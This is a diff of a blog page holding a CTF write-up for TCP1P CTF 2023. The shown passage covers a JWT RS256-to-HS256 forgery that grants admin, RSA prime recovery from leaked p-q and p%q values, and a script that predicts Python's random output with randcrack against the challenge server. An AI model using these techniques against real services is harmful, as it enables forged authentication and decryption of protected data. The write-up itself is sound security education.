@@ -106,24 +106,29 @@ From the source code, it can be seen that the jwt." />
   <link rel="apple-touch-icon" href="https://berliangabriel.github.io/apple-touch-icon.png" />
 
   
-  <meta name="generator" content="Hugo 0.92.2" />
+  <meta name="generator" content="Hugo 0.127.0">
 
   
   
   
   
   
-  <meta itemprop="name" content="TCP1P CTF 2023">
-<meta itemprop="description" content="It was an exhilarating experience to compete in TCP1P CTF as team Fidethus, with Chovid99 and Djavaa. Despite narrowly missing out on the Top 3, securing a 4th place finish was a tremendous honor, especially considering we were a three-member team competing against teams with many more members. Below is the write-up for some of the challenges that we solved. Cryptography Jack&rsquo;s Worst Trials (7 Solves, 464 Points)
-From the source code, it can be seen that the jwt."><meta itemprop="datePublished" content="2023-10-18T19:33:11+07:00" />
-<meta itemprop="dateModified" content="2023-10-18T19:33:11+07:00" />
-<meta itemprop="wordCount" content="3414">
-<meta itemprop="keywords" content="" />
+
+
   
-  <meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="TCP1P CTF 2023"/>
-<meta name="twitter:description" content="It was an exhilarating experience to compete in TCP1P CTF as team Fidethus, with Chovid99 and Djavaa. Despite narrowly missing out on the Top 3, securing a 4th place finish was a tremendous honor, especially considering we were a three-member team competing against teams with many more members. Below is the write-up for some of the challenges that we solved. Cryptography Jack&rsquo;s Worst Trials (7 Solves, 464 Points)
-From the source code, it can be seen that the jwt."/>
+  
+  <meta itemprop="name" content="TCP1P CTF 2023">
+  <meta itemprop="description" content="It was an exhilarating experience to compete in TCP1P CTF as team Fidethus, with Chovid99 and Djavaa. Despite narrowly missing out on the Top 3, securing a 4th place finish was a tremendous honor, especially considering we were a three-member team competing against teams with many more members. Below is the write-up for some of the challenges that we solved. Cryptography Jack’s Worst Trials (7 Solves, 464 Points)
+From the source code, it can be seen that the jwt.">
+  <meta itemprop="datePublished" content="2023-10-18T19:33:11+07:00">
+  <meta itemprop="dateModified" content="2023-10-18T19:33:11+07:00">
+  <meta itemprop="wordCount" content="3421">
+  
+  
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="TCP1P CTF 2023">
+  <meta name="twitter:description" content="It was an exhilarating experience to compete in TCP1P CTF as team Fidethus, with Chovid99 and Djavaa. Despite narrowly missing out on the Top 3, securing a 4th place finish was a tremendous honor, especially considering we were a three-member team competing against teams with many more members. Below is the write-up for some of the challenges that we solved. Cryptography Jack’s Worst Trials (7 Solves, 464 Points)
+From the source code, it can be seen that the jwt.">
 
   
   
@@ -138,7 +143,7 @@ From the source code, it can be seen that the jwt."/>
   <div class="relative z-50 mr-auto flex items-center">
     <a
       class="-translate-x-[1px] -translate-y-[1px] text-2xl font-semibold"
-      href="https://berliangabriel.github.io"
+      href="https://berliangabriel.github.io/"
       >Berlian Gabriel</a
     >
     <div
@@ -283,76 +288,76 @@ From the source code, it can be seen that the jwt."/>
 <p>Before building the docker, modify the jwt_forgery.py by adding this on line 41
 <code>    payload['admin'] = True</code>
 so that we can directly use the printed jwt to login and get the flag</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">└─$ sudo docker build . -t sig2n
-
-└─$ sudo docker run -it sig2n /bin/bash
-root@c2ab8f6e13b0:/app# python3 jwt_forgery.py eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJwdWJsaWNfaWQiOiI5NDcyNjBmMy01YWI4LTQ2ZDItYmIwNC1mN2U2OTc3NmIxMTYiLCJuYW1lIjoiMiIsImFkbWluIjpmYWxzZSwiZXhwIjoxNjk3NzM1NDY4fQ.Ka5MmMgtxoXlyENmLywLpcJR04r2Q_WqO78Jy9HmLyBs3DldcUrdvws9GMal8CRTQx0pKN25nwZ1cxz-o0E6tyNn8cbVVV0jwBDrz-soCplDpIAf6YzWMgIGdwnfhGZ1SWrUZn_fP4B6aBavOJO6pDK0oMLHKDlYq1spEjiZ9EQ eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJwdWJsaWNfaWQiOiI5NDcyNjBmMy01YWI4LTQ2ZDItYmIwNC1mN2U2OTc3NmIxMTYiLCJuYW1lIjoiMiIsImFkbWluIjpmYWxzZSwiZXhwIjoxNjk3NzM1NDc2fQ.aH-p_7RbNAt9dT_nSlX1i0PNlebdNKqfaqFZhgL9ADRe71USYQnQgFYqlNznchXpgaza3MrGVwVP5b73aHFb_EXPaRKkfhPv8dW9VKjggnNtvSyRmUHoTvXrP7SDMOqgh27MTP6kUOsvZh1E0YTnlaTxe3QLRFBDjDgGywCyasc
-<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> GCD:  0x1
-<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> GCD:  0xac093f13ecc248298f46e6c16267db10fd6a955282165b665a1bbea1dc831651cf3a76eddb72e1ffca011a4664fc8956f9cd592e2c6dec0fb656bb5af4a9c00d3f6bd1e0a116fc1835450fa890d1f48653b18d005d33616e8da4246c98da98ce76d44090ab16c5de9e972cbb84e258b2dfbba47cb09667f31b7195d68887bccf
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Found n with multiplier <span style="color:#ae81ff">1</span>  :
- 0xac093f13ecc248298f46e6c16267db10fd6a955282165b665a1bbea1dc831651cf3a76eddb72e1ffca011a4664fc8956f9cd592e2c6dec0fb656bb5af4a9c00d3f6bd1e0a116fc1835450fa890d1f48653b18d005d33616e8da4246c98da98ce76d44090ab16c5de9e972cbb84e258b2dfbba47cb09667f31b7195d68887bccf
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Written to ac093f13ecc24829_65537_x509.pem
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Tampered JWT: b<span style="color:#e6db74">&#39;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwdWJsaWNfaWQiOiAiOTQ3MjYwZjMtNWFiOC00NmQyLWJiMDQtZjdlNjk3NzZiMTE2IiwgIm5hbWUiOiAiMiIsICJhZG1pbiI6IHRydWUsICJleHAiOiAxNjk3ODIxNjAwfQ.5hogYpjETLomsy6KuesaVoPAJ8NLOxhJIIOyX4xaqm0&#39;</span>
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Written to ac093f13ecc24829_65537_pkcs1.pem
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Tampered JWT: b<span style="color:#e6db74">&#39;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwdWJsaWNfaWQiOiAiOTQ3MjYwZjMtNWFiOC00NmQyLWJiMDQtZjdlNjk3NzZiMTE2IiwgIm5hbWUiOiAiMiIsICJhZG1pbiI6IHRydWUsICJleHAiOiAxNjk3ODIxNjAwfQ.1Y6oTMLKduPVd-ywj4OIzBaJ_3roybXTImqXgCoXfaM&#39;</span>
-<span style="color:#f92672">================================================================================</span>
-Here are your JWT<span style="color:#960050;background-color:#1e0010">&#39;</span>s once again <span style="color:#66d9ef">for</span> your copypasting pleasure
-<span style="color:#f92672">================================================================================</span>
-eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwdWJsaWNfaWQiOiAiOTQ3MjYwZjMtNWFiOC00NmQyLWJiMDQtZjdlNjk3NzZiMTE2IiwgIm5hbWUiOiAiMiIsICJhZG1pbiI6IHRydWUsICJleHAiOiAxNjk3ODIxNjAwfQ.5hogYpjETLomsy6KuesaVoPAJ8NLOxhJIIOyX4xaqm0
-eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwdWJsaWNfaWQiOiAiOTQ3MjYwZjMtNWFiOC00NmQyLWJiMDQtZjdlNjk3NzZiMTE2IiwgIm5hbWUiOiAiMiIsICJhZG1pbiI6IHRydWUsICJleHAiOiAxNjk3ODIxNjAwfQ.1Y6oTMLKduPVd-ywj4OIzBaJ_3roybXTImqXgCoXfaM
-</code></pre></div><p>Use the tampered jwt signed with PKCS1
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>└─$ sudo docker build . -t sig2n
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>└─$ sudo docker run -it sig2n /bin/bash
+</span></span><span style="display:flex;"><span>root@c2ab8f6e13b0:/app# python3 jwt_forgery.py eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJwdWJsaWNfaWQiOiI5NDcyNjBmMy01YWI4LTQ2ZDItYmIwNC1mN2U2OTc3NmIxMTYiLCJuYW1lIjoiMiIsImFkbWluIjpmYWxzZSwiZXhwIjoxNjk3NzM1NDY4fQ.Ka5MmMgtxoXlyENmLywLpcJR04r2Q_WqO78Jy9HmLyBs3DldcUrdvws9GMal8CRTQx0pKN25nwZ1cxz-o0E6tyNn8cbVVV0jwBDrz-soCplDpIAf6YzWMgIGdwnfhGZ1SWrUZn_fP4B6aBavOJO6pDK0oMLHKDlYq1spEjiZ9EQ eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJwdWJsaWNfaWQiOiI5NDcyNjBmMy01YWI4LTQ2ZDItYmIwNC1mN2U2OTc3NmIxMTYiLCJuYW1lIjoiMiIsImFkbWluIjpmYWxzZSwiZXhwIjoxNjk3NzM1NDc2fQ.aH-p_7RbNAt9dT_nSlX1i0PNlebdNKqfaqFZhgL9ADRe71USYQnQgFYqlNznchXpgaza3MrGVwVP5b73aHFb_EXPaRKkfhPv8dW9VKjggnNtvSyRmUHoTvXrP7SDMOqgh27MTP6kUOsvZh1E0YTnlaTxe3QLRFBDjDgGywCyasc
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> GCD:  0x1
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> GCD:  0xac093f13ecc248298f46e6c16267db10fd6a955282165b665a1bbea1dc831651cf3a76eddb72e1ffca011a4664fc8956f9cd592e2c6dec0fb656bb5af4a9c00d3f6bd1e0a116fc1835450fa890d1f48653b18d005d33616e8da4246c98da98ce76d44090ab16c5de9e972cbb84e258b2dfbba47cb09667f31b7195d68887bccf
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Found n with multiplier <span style="color:#ae81ff">1</span>  :
+</span></span><span style="display:flex;"><span> 0xac093f13ecc248298f46e6c16267db10fd6a955282165b665a1bbea1dc831651cf3a76eddb72e1ffca011a4664fc8956f9cd592e2c6dec0fb656bb5af4a9c00d3f6bd1e0a116fc1835450fa890d1f48653b18d005d33616e8da4246c98da98ce76d44090ab16c5de9e972cbb84e258b2dfbba47cb09667f31b7195d68887bccf
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Written to ac093f13ecc24829_65537_x509.pem
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Tampered JWT: b<span style="color:#e6db74">&#39;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwdWJsaWNfaWQiOiAiOTQ3MjYwZjMtNWFiOC00NmQyLWJiMDQtZjdlNjk3NzZiMTE2IiwgIm5hbWUiOiAiMiIsICJhZG1pbiI6IHRydWUsICJleHAiOiAxNjk3ODIxNjAwfQ.5hogYpjETLomsy6KuesaVoPAJ8NLOxhJIIOyX4xaqm0&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Written to ac093f13ecc24829_65537_pkcs1.pem
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Tampered JWT: b<span style="color:#e6db74">&#39;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwdWJsaWNfaWQiOiAiOTQ3MjYwZjMtNWFiOC00NmQyLWJiMDQtZjdlNjk3NzZiMTE2IiwgIm5hbWUiOiAiMiIsICJhZG1pbiI6IHRydWUsICJleHAiOiAxNjk3ODIxNjAwfQ.1Y6oTMLKduPVd-ywj4OIzBaJ_3roybXTImqXgCoXfaM&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">================================================================================</span>
+</span></span><span style="display:flex;"><span>Here are your JWT<span style="color:#960050;background-color:#1e0010">&#39;</span>s once again <span style="color:#66d9ef">for</span> your copypasting pleasure
+</span></span><span style="display:flex;"><span><span style="color:#f92672">================================================================================</span>
+</span></span><span style="display:flex;"><span>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwdWJsaWNfaWQiOiAiOTQ3MjYwZjMtNWFiOC00NmQyLWJiMDQtZjdlNjk3NzZiMTE2IiwgIm5hbWUiOiAiMiIsICJhZG1pbiI6IHRydWUsICJleHAiOiAxNjk3ODIxNjAwfQ.5hogYpjETLomsy6KuesaVoPAJ8NLOxhJIIOyX4xaqm0
+</span></span><span style="display:flex;"><span>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwdWJsaWNfaWQiOiAiOTQ3MjYwZjMtNWFiOC00NmQyLWJiMDQtZjdlNjk3NzZiMTE2IiwgIm5hbWUiOiAiMiIsICJhZG1pbiI6IHRydWUsICJleHAiOiAxNjk3ODIxNjAwfQ.1Y6oTMLKduPVd-ywj4OIzBaJ_3roybXTImqXgCoXfaM
+</span></span></code></pre></div><p>Use the tampered jwt signed with PKCS1
 <img src="https://raw.githubusercontent.com/BerlianGabriel/BerlianGabriel.github.io/main/post/tcp1p-ctf-2023/Pasted%20image%2020231020002056.png" alt=""></p>
 <p><strong><code>FLAG: TCP1P{im_only_human_after_all_dont_put_your_blame_on_me}</code></strong></p>
 <h2 id="cherry-leak">Cherry Leak</h2>
 <p>(28 Solves, 100 Points)</p>
 <p>Do the following to get leaks</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc ctf.tcp1p.com <span style="color:#ae81ff">13339</span>
-1. Get new prime
-2. Get leak
-3. Get flag
-4. Exit
-&gt; <span style="color:#ae81ff">2</span>
-choose leak p ? q <span style="color:#f92672">(</span>+-*/%<span style="color:#f92672">)</span>
-&gt; -
-p - q <span style="color:#f92672">=</span> <span style="color:#ae81ff">178833035477634337098787980370911105254629893438692684220652066155514034693363610427233533587851396508440895819438762025942463830764491299098061633609825779423798024198412008546459077519636702075113034468959303246210233949573558799895557880713333389929206370913498006367650619333909993622659004082831927619986</span>
-1. Get new prime
-2. Get leak
-3. Get flag
-4. Exit
-&gt; <span style="color:#ae81ff">2</span>
-choose leak p ? q <span style="color:#f92672">(</span>+-*/%<span style="color:#f92672">)</span>
-&gt; %
-p % q <span style="color:#f92672">=</span> <span style="color:#ae81ff">506579932144242488510267028157572488601778337363320115090503621878348979844649750150976952703643698993207121045384610633249467380657658156129139926100030</span>
-1. Get new prime
-2. Get leak
-3. Get flag
-4. Exit
-&gt; <span style="color:#ae81ff">1</span>
-which prime? <span style="color:#f92672">(</span>p/q<span style="color:#f92672">)</span>
-&gt; p
-1. Get new prime
-2. Get leak
-3. Get flag
-4. Exit
-&gt; <span style="color:#ae81ff">2</span>
-choose leak p ? q <span style="color:#f92672">(</span>+-*/%<span style="color:#f92672">)</span>
-&gt; -
-p - q <span style="color:#f92672">=</span> <span style="color:#ae81ff">103816887630328490784464141363658470265330354427339999561411312301425538008944161756656842333478007179306724812312194271263713340527164930575110028913623584877345404169453541385820262636418407132812202271626152087313626734095261935604346659537783191331265054464787402158478966765513751606342951875834708272118</span>
-1. Get new prime
-2. Get leak
-3. Get flag
-4. Exit
-&gt; <span style="color:#ae81ff">2</span>
-choose leak p ? q <span style="color:#f92672">(</span>+-*/%<span style="color:#f92672">)</span>
-&gt; %
-p % q <span style="color:#f92672">=</span> <span style="color:#ae81ff">6046091823226464360662564452266498129048036885442934910483196208517731538612616575944306151891309608408464264521692958315237194591593475182223931830482049</span>
-1. Get new prime
-2. Get leak
-3. Get flag
-4. Exit
-&gt; <span style="color:#ae81ff">3</span>
-c <span style="color:#f92672">=</span> <span style="color:#ae81ff">494329538289477713121915764883888339697884802592994711222985484899442960724543539923102765594529982984561135871757747223513659422455404597288575930312382081435298705504094376003451963797425612710888134817162056161732689106617516869903658006724890304817654659507418014204730207057548511433724145438883975967577431339890541845973931538987021231756464267276947180674222187112996668481587264015823583240542021338267682243995711922518314203414008226461521497119910584</span>
-</code></pre></div><p>With a bit of math, we can obtain:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc ctf.tcp1p.com <span style="color:#ae81ff">13339</span>
+</span></span><span style="display:flex;"><span>1. Get new prime
+</span></span><span style="display:flex;"><span>2. Get leak
+</span></span><span style="display:flex;"><span>3. Get flag
+</span></span><span style="display:flex;"><span>4. Exit
+</span></span><span style="display:flex;"><span>&gt; <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>choose leak p ? q <span style="color:#f92672">(</span>+-*/%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>&gt; -
+</span></span><span style="display:flex;"><span>p - q <span style="color:#f92672">=</span> <span style="color:#ae81ff">178833035477634337098787980370911105254629893438692684220652066155514034693363610427233533587851396508440895819438762025942463830764491299098061633609825779423798024198412008546459077519636702075113034468959303246210233949573558799895557880713333389929206370913498006367650619333909993622659004082831927619986</span>
+</span></span><span style="display:flex;"><span>1. Get new prime
+</span></span><span style="display:flex;"><span>2. Get leak
+</span></span><span style="display:flex;"><span>3. Get flag
+</span></span><span style="display:flex;"><span>4. Exit
+</span></span><span style="display:flex;"><span>&gt; <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>choose leak p ? q <span style="color:#f92672">(</span>+-*/%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>&gt; %
+</span></span><span style="display:flex;"><span>p % q <span style="color:#f92672">=</span> <span style="color:#ae81ff">506579932144242488510267028157572488601778337363320115090503621878348979844649750150976952703643698993207121045384610633249467380657658156129139926100030</span>
+</span></span><span style="display:flex;"><span>1. Get new prime
+</span></span><span style="display:flex;"><span>2. Get leak
+</span></span><span style="display:flex;"><span>3. Get flag
+</span></span><span style="display:flex;"><span>4. Exit
+</span></span><span style="display:flex;"><span>&gt; <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>which prime? <span style="color:#f92672">(</span>p/q<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>&gt; p
+</span></span><span style="display:flex;"><span>1. Get new prime
+</span></span><span style="display:flex;"><span>2. Get leak
+</span></span><span style="display:flex;"><span>3. Get flag
+</span></span><span style="display:flex;"><span>4. Exit
+</span></span><span style="display:flex;"><span>&gt; <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>choose leak p ? q <span style="color:#f92672">(</span>+-*/%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>&gt; -
+</span></span><span style="display:flex;"><span>p - q <span style="color:#f92672">=</span> <span style="color:#ae81ff">103816887630328490784464141363658470265330354427339999561411312301425538008944161756656842333478007179306724812312194271263713340527164930575110028913623584877345404169453541385820262636418407132812202271626152087313626734095261935604346659537783191331265054464787402158478966765513751606342951875834708272118</span>
+</span></span><span style="display:flex;"><span>1. Get new prime
+</span></span><span style="display:flex;"><span>2. Get leak
+</span></span><span style="display:flex;"><span>3. Get flag
+</span></span><span style="display:flex;"><span>4. Exit
+</span></span><span style="display:flex;"><span>&gt; <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>choose leak p ? q <span style="color:#f92672">(</span>+-*/%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>&gt; %
+</span></span><span style="display:flex;"><span>p % q <span style="color:#f92672">=</span> <span style="color:#ae81ff">6046091823226464360662564452266498129048036885442934910483196208517731538612616575944306151891309608408464264521692958315237194591593475182223931830482049</span>
+</span></span><span style="display:flex;"><span>1. Get new prime
+</span></span><span style="display:flex;"><span>2. Get leak
+</span></span><span style="display:flex;"><span>3. Get flag
+</span></span><span style="display:flex;"><span>4. Exit
+</span></span><span style="display:flex;"><span>&gt; <span style="color:#ae81ff">3</span>
+</span></span><span style="display:flex;"><span>c <span style="color:#f92672">=</span> <span style="color:#ae81ff">494329538289477713121915764883888339697884802592994711222985484899442960724543539923102765594529982984561135871757747223513659422455404597288575930312382081435298705504094376003451963797425612710888134817162056161732689106617516869903658006724890304817654659507418014204730207057548511433724145438883975967577431339890541845973931538987021231756464267276947180674222187112996668481587264015823583240542021338267682243995711922518314203414008226461521497119910584</span>
+</span></span></code></pre></div><p>With a bit of math, we can obtain:</p>
 <pre tabindex="0"><code>s1 = p-q1 = 178833035477634337098787980370911105254629893438692684220652066155514034693363610427233533587851396508440895819438762025942463830764491299098061633609825779423798024198412008546459077519636702075113034468959303246210233949573558799895557880713333389929206370913498006367650619333909993622659004082831927619986
 
 t1 = p%q1 = 506579932144242488510267028157572488601778337363320115090503621878348979844649750150976952703643698993207121045384610633249467380657658156129139926100030
@@ -375,19 +380,19 @@ k2*q + t2 = s2 + q
 
 since q is prime, we can obtain K*q from gcd((k1 - 1)*q, (k2 - 1)*q) = gcd(s1-t1, s2-t2). We can then factorize K*q to get the prime q
 </code></pre><p>We can then quickly solve this calculation using sage</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">sage: ecm<span style="color:#f92672">.</span>factor(gcd(s1<span style="color:#f92672">-</span>t1,s2<span style="color:#f92672">-</span>t2))
-[<span style="color:#ae81ff">3</span>,
- <span style="color:#ae81ff">10854393443988059968673350220604514443995514587151779202006695752710306191576456930155256281977692624907459497238681266212611293651481305920079548632278681</span>]
-sage: q <span style="color:#f92672">=</span> <span style="color:#ae81ff">108543934439880599686733502206045144439955145871517792020066957527103061915764569301552562819776926249074594972386812662126</span>
-<span style="color:#f92672">....</span>: <span style="color:#ae81ff">11293651481305920079548632278681</span>
-sage: p <span style="color:#f92672">=</span> s2 <span style="color:#f92672">+</span> q
-sage: e <span style="color:#f92672">=</span> <span style="color:#ae81ff">65537</span>
-sage: d <span style="color:#f92672">=</span> e<span style="color:#f92672">.</span>inverse_mod((p<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">*</span>(q<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>))
-sage: m <span style="color:#f92672">=</span> pow(c,d,p<span style="color:#f92672">*</span>q)
-sage: <span style="color:#f92672">from</span> Crypto.Util.number <span style="color:#f92672">import</span> long_to_bytes
-sage: long_to_bytes(int(m))
-<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;TCP1P{in_life&#39;s_abundance_a_fragment_suffices}&#34;</span>
-</code></pre></div><p><strong><code>FLAG: TCP1P{in_life's_abundance_a_fragment_suffices}</code></strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>sage: ecm<span style="color:#f92672">.</span>factor(gcd(s1<span style="color:#f92672">-</span>t1,s2<span style="color:#f92672">-</span>t2))
+</span></span><span style="display:flex;"><span>[<span style="color:#ae81ff">3</span>,
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">10854393443988059968673350220604514443995514587151779202006695752710306191576456930155256281977692624907459497238681266212611293651481305920079548632278681</span>]
+</span></span><span style="display:flex;"><span>sage: q <span style="color:#f92672">=</span> <span style="color:#ae81ff">108543934439880599686733502206045144439955145871517792020066957527103061915764569301552562819776926249074594972386812662126</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">....</span>: <span style="color:#ae81ff">11293651481305920079548632278681</span>
+</span></span><span style="display:flex;"><span>sage: p <span style="color:#f92672">=</span> s2 <span style="color:#f92672">+</span> q
+</span></span><span style="display:flex;"><span>sage: e <span style="color:#f92672">=</span> <span style="color:#ae81ff">65537</span>
+</span></span><span style="display:flex;"><span>sage: d <span style="color:#f92672">=</span> e<span style="color:#f92672">.</span>inverse_mod((p<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">*</span>(q<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>))
+</span></span><span style="display:flex;"><span>sage: m <span style="color:#f92672">=</span> pow(c,d,p<span style="color:#f92672">*</span>q)
+</span></span><span style="display:flex;"><span>sage: <span style="color:#f92672">from</span> Crypto.Util.number <span style="color:#f92672">import</span> long_to_bytes
+</span></span><span style="display:flex;"><span>sage: long_to_bytes(int(m))
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;TCP1P{in_life&#39;s_abundance_a_fragment_suffices}&#34;</span>
+</span></span></code></pre></div><p><strong><code>FLAG: TCP1P{in_life's_abundance_a_fragment_suffices}</code></strong></p>
 <h2 id="spider-shambles">Spider Shambles</h2>
 <p>(31 Solves, 100 Points)</p>
 <p>The method <code>random.getrandbits()</code> is not cryptographically secure. We can use <code>randcrack</code> (<a href="https://github.com/tna0y/Python-random-module-cracker">https://github.com/tna0y/Python-random-module-cracker</a>) to predict the the next pseudorandom number.</p>
@@ -406,119 +411,117 @@ Hence, we can upload file containing null bytes, which when XOR-ed against the r
 </ol>
 <p>Note that it might take a while to run the script due to the calculation of <code>randcrack</code> for large result
 (~15 minutes)</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> requests
-<span style="color:#f92672">from</span> randcrack <span style="color:#f92672">import</span> RandCrack
-<span style="color:#f92672">from</span> Crypto.Util.number <span style="color:#f92672">import</span> bytes_to_long <span style="color:#66d9ef">as</span> b2l, long_to_bytes <span style="color:#66d9ef">as</span> l2b
-<span style="color:#f92672">import</span> io
-
-<span style="color:#75715e"># Base URL of the server</span>
-BASE_URL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://ctf.tcp1p.com:54734/&#34;</span>
-
-<span style="color:#75715e"># Create a session to persist cookies and other session-based info</span>
-session <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>Session()
-
-<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">upload_zero_file</span>():
-    <span style="color:#75715e"># Create a 4-byte file containing only zero bytes</span>
-    zero_file <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>BytesIO(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00\x00\x00\x00</span><span style="color:#e6db74">&#39;</span>)
-    
-    <span style="color:#75715e"># POST request to the server</span>
-    response <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>post(
-        BASE_URL,
-        files<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;file&#34;</span>: (<span style="color:#e6db74">&#34;zero.txt&#34;</span>, zero_file)}
-    )
-    
-    <span style="color:#75715e"># Return the content of the response, which should be the encrypted file data</span>
-    <span style="color:#66d9ef">return</span> response<span style="color:#f92672">.</span>content
-
-rc <span style="color:#f92672">=</span> RandCrack()
-
-<span style="color:#75715e"># List to collect the downloaded data</span>
-downloaded_data_list <span style="color:#f92672">=</span> []
-
-<span style="color:#75715e"># Send 625 POST requests and collect the data</span>
-<span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">625</span>):
-    downloaded_data_list<span style="color:#f92672">.</span>append(upload_zero_file())
-
-<span style="color:#75715e"># Get the content from /flago</span>
-response <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>get(BASE_URL <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;flago&#34;</span>)
-<span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;flago_encrypted_content&#34;</span>, <span style="color:#e6db74">&#34;wb&#34;</span>) <span style="color:#66d9ef">as</span> file:
-    file<span style="color:#f92672">.</span>write(response<span style="color:#f92672">.</span>content)
-
-<span style="color:#75715e"># Submit the first 624 downloaded data to RandCrack</span>
-<span style="color:#66d9ef">for</span> data <span style="color:#f92672">in</span> downloaded_data_list[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]:
-    number <span style="color:#f92672">=</span> b2l(data)
-    rc<span style="color:#f92672">.</span>submit(number)
-
-<span style="color:#75715e"># Convert the 625th downloaded data to a number and print it</span>
-final_number <span style="color:#f92672">=</span> b2l(downloaded_data_list[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])
-print(<span style="color:#e6db74">&#34;625th POST request number:&#34;</span>, final_number)
-
-<span style="color:#75715e"># Predict the next random number using RandCrack</span>
-predicted_number <span style="color:#f92672">=</span> rc<span style="color:#f92672">.</span>predict_getrandbits(<span style="color:#ae81ff">32</span>)
-print(<span style="color:#e6db74">&#34;Predicted random number:&#34;</span>, predicted_number)
-
-<span style="color:#75715e"># XOR and encryption functions</span>
-<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">xor</span>(a, b):
-    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join([bytes([_a <span style="color:#f92672">^</span> _b]) <span style="color:#66d9ef">for</span> _a, _b <span style="color:#f92672">in</span> zip(a, b)])
-
-<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">encropt</span>(buff):
